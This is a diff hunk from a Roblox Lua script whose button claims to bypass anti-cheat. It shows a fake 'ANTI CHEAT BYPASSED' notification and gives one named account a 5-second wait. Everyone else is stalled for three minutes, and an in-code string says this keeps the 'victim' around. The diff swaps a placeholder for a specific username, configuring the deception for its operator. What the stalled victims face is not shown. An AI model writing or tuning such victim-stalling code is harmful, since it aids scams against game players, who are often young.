@@ -132,7 +132,7 @@ local Players = game:GetService("Players")
         BypassButton.MouseButton1Click:Connect(function()
             ShowNotification("PLEASE WAIT...")
         
-            if LocalPlayer.Name == "change to ur user" or LocalPlayer.Name == "this gives you only 5 seconds loading time while ur victim gets 3 minutes, so they will stay for long" then
+            if LocalPlayer.Name == "qasim_20133" or LocalPlayer.Name == "this gives you only 5 seconds loading time while ur victim gets 3 minutes, so they will stay for long" then
                 task.wait(5) -- Wait 5 seconds
                 ShowNotification("✅ ANTI CHEAT BYPASSED")
             else
